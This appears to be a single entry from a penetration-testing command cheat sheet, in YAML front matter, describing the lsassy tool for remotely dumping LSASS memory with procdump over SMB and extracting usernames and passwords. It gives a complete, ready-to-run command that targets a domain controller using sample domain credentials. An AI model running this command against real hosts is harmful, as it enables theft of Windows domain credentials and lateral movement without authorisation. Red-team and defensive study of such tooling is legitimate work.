---
title: |
  Extract Credentials Remotely (Procdump )
description: |
  Python tool to remotely extract credentials on a set of hosts. This tool uses impacket project to remotely read necessary bytes in lsass dump and pypykatz to extract credentials.

command: |
  lsassy -m 2 -p /tmp/procdump.exe test.local/testuser:Welkom01!@dc01.test.local
items:
  - Username
  - Password
services:
  - SMB
OS:
  - Linux
attack_types:
  - Enumeration
references:
  - https://github.com/Hackndo/lsassy
  - https://en.hackndo.com/remote-lsass-dump-passwords/
---
